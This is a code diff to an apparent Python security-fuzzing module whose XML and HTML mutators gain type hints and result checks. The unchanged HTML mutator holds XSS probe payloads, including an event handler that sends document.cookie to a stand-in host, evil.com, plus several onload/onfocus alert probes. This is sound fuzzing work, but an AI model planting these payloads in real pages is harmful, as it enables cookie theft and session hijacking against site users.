@@ -12,7 +12,7 @@ import random
 import re
 import xml.etree.ElementTree as ET
 from abc import ABC, abstractmethod
-from typing import Any
+from typing import Any, Callable
 
 # Maximum time allowed for a single regex operation (seconds).
 _REGEX_TIMEOUT: float = 2.0
@@ -22,7 +22,7 @@ class _RegexTimeoutError(Exception):
     """Raised when a regex operation exceeds its time limit."""
 
 
-def _safe_re_sub(pattern: str, repl: str, string: str, *, flags: int = 0, count: int = 0) -> str:
+def _safe_re_sub(pattern: str, repl: str | Callable[[re.Match[str]], str], string: str, *, flags: int = 0, count: int = 0) -> str:
     """re.sub wrapper with a wall-clock timeout to prevent ReDoS."""
     import concurrent.futures
 
@@ -157,7 +157,7 @@ class XMLASTMutator(BaseASTMutator):
 
     def _mutate_text_content(self, xml_str: str) -> str | None:
         """Replace text content in XML elements with boundary values."""
-        return _safe_re_sub(
+        result = _safe_re_sub(
             r">([^<]{0,10000})<",
             lambda m: (
                 ">"
@@ -166,6 +166,9 @@ class XMLASTMutator(BaseASTMutator):
             ),
             xml_str,
         )
+        if not isinstance(result, str):
+            return None
+        return result
 
     def _swap_elements(self, xml_str: str) -> str | None:
         """Swap the order of sibling XML elements."""
@@ -204,7 +207,7 @@ class XMLASTMutator(BaseASTMutator):
 
     def _mutate_attributes(self, xml_str: str) -> str | None:
         """Mutate XML attribute values."""
-        return _safe_re_sub(
+        result = _safe_re_sub(
             r'(\w+)=["\']([^"\']{0,10000})["\']',
             lambda m: (
                 m.group(1)
@@ -214,6 +217,9 @@ class XMLASTMutator(BaseASTMutator):
             ),
             xml_str,
         )
+        if not isinstance(result, str):
+            return None
+        return result
 
     @staticmethod
     def _safe_parse(xml_str: str) -> ET.Element | None:
@@ -249,7 +255,7 @@ class HTMLASTMutator(BaseASTMutator):
 
     def _mutate_attributes(self, html_str: str) -> str | None:
         """Replace attribute values with XSS probes."""
-        return _safe_re_sub(
+        result = _safe_re_sub(
             r'(\w+)=["\']([^"\']{0,10000})["\']',
             lambda m: (
                 m.group(1)
@@ -259,6 +265,9 @@ class HTMLASTMutator(BaseASTMutator):
             ),
             html_str,
         )
+        if not isinstance(result, str):
+            return None
+        return result
 
     def _inject_event_handlers(self, html_str: str) -> str | None:
         """Inject event handler attributes into HTML tags."""
@@ -266,7 +275,7 @@ class HTMLASTMutator(BaseASTMutator):
         handlers = ["alert(1)", "fetch('https://evil.com/?'+document.cookie)"]
         tag_pattern = re.compile(r"(<\s*\w+[^>]{0,5000})>")
 
-        def _inject(m: re.Match) -> str:
+        def _inject(m: re.Match[str]) -> str:
             tag = m.group(1)
             if any(ev.split("=")[0] in tag for ev in events):
                 return tag + ">"
@@ -274,7 +283,10 @@ class HTMLASTMutator(BaseASTMutator):
             handler = random.choice(handlers)
             return f'{tag} {event}="{handler}">'
 
-        return tag_pattern.sub(_inject, html_str)
+        result = tag_pattern.sub(_inject, html_str)
+        if not isinstance(result, str):
+            return None
+        return result
 
     def _deeply_nest(self, html_str: str) -> str | None:
         """Nest HTML tags deeply to test parser stack limits."""
@@ -295,4 +307,7 @@ class HTMLASTMutator(BaseASTMutator):
             "<body onload=alert(1)>",
             "<input autofocus onfocus=alert(1)>",
         ]
-        return html_str + random.choice(scripts)
+        result = html_str + random.choice(scripts)
+        if not isinstance(result, str):
+            return None
+        return result
